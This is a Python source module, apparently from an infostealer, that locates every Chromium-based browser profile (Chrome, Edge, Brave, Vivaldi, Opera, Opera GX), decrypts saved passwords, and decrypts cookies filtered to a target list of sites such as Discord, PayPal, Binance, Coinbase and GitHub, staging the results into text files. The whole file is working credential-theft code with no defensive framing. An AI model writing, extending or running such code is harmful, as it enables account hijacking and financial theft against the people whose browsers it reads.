"""Chromium password and cookie extraction for every installed profile."""

import os
import time

from .util import (
    APPDATA,
    LOCALAPPDATA,
    chromium_key,
    decrypt_blob,
    sqlite_rows,
)

ROOTS = [
    ("chrome", os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data")),
    ("edge", os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data")),
    ("brave", os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")),
    ("vivaldi", os.path.join(LOCALAPPDATA, "Vivaldi", "User Data")),
    ("opera", os.path.join(APPDATA, "Opera Software", "Opera Stable")),
    ("opera_gx", os.path.join(APPDATA, "Opera Software", "Opera GX Stable")),
]

COOKIE_DOMAINS = {
    "discord.com",
    "steamcommunity.com",
    "roblox.com",
    "instagram.com",
    "facebook.com",
    "tiktok.com",
    "twitter.com",
    "x.com",
    "paypal.com",
    "binance.com",
    "coinbase.com",
    "outlook.com",
    "live.com",
    "github.com",
    "netflix.com",
    "spotify.com",
    "twitch.tv",
    "amazon.com",
    "google.com",
    "youtube.com",
    "whatsapp.com",
    "web.telegram.org",
    "yahoo.com",
    "protonmail.com",
    "mega.nz",
    "dropbox.com",
}


def profile_dirs(root):
    if not os.path.isdir(root):
        return
    candidates = [root]
    try:
        candidates += [os.path.join(root, entry) for entry in sorted(os.listdir(root))]
    except OSError:
        return
    seen = set()
    for path in candidates:
        if not os.path.isdir(path):
            continue
        real = os.path.realpath(path)
        if real in seen:
            continue
        if path == root or any(
            os.path.exists(os.path.join(path, marker))
            for marker in ("Login Data", "Preferences", "Network")
        ):
            seen.add(real)
            yield path


def cookie_db(profile):
    for candidate in (
        os.path.join(profile, "Network", "Cookies"),
        os.path.join(profile, "Cookies"),
    ):
        if os.path.isfile(candidate):
            return candidate
    return None


def _wanted_host(host):
    host = (host or "").lstrip(".").lower()
    return any(host == domain or host.endswith("." + domain) for domain in COOKIE_DOMAINS)


def _stamp(chrome_us):
    if not chrome_us:
        return "session"
    try:
        return time.strftime("%Y-%m-%d", time.gmtime(chrome_us / 1_000_000 - 11644473600))
    except (ValueError, OSError):
        return "?"


def extract_passwords(stage):
    lines = []
    for name, root in ROOTS:
        if not os.path.isdir(root):
            continue
        key = chromium_key(root)
        for profile in profile_dirs(root):
            db = os.path.join(profile, "Login Data")
            rows = sqlite_rows(
                db, "SELECT origin_url, username_value, password_value FROM logins"
            )
            for origin, username, blob in rows:
                if not username and not blob:
                    continue
                try:
                    password = decrypt_blob(blob, key).decode("utf-8", "replace")
                except Exception as exc:
                    password = "<%s>" % exc
                lines.append("%s\t%s\t%s\t%s" % (name, origin, username, password))
    if lines:
        unique = list(dict.fromkeys(lines))
        stage.add_text("browsers", "passwords.txt", "\n".join(unique[:5000]))


def extract_cookies(stage):
    lines = []
    for name, root in ROOTS:
        if not os.path.isdir(root):
            continue
        key = chromium_key(root)
        for profile in profile_dirs(root):
            db = cookie_db(profile)
            if not db:
                continue
            rows = sqlite_rows(
                db,
                "SELECT host_key, name, encrypted_value, value, expires_utc FROM cookies",
            )
            for host, cookie_name, encrypted, plain, expires in rows:
                if not _wanted_host(host):
                    continue
                if plain:
                    value = plain
                else:
                    try:
                        value = decrypt_blob(encrypted, key).decode("utf-8", "replace")
                    except Exception:
                        continue
                lines.append(
                    "%s\t%s\t%s\t%s\t%s" % (name, host, cookie_name, value, _stamp(expires))
                )
    if lines:
        unique = list(dict.fromkeys(lines))
        stage.add_text("browsers", "cookies.txt", "\n".join(unique[:3000]))
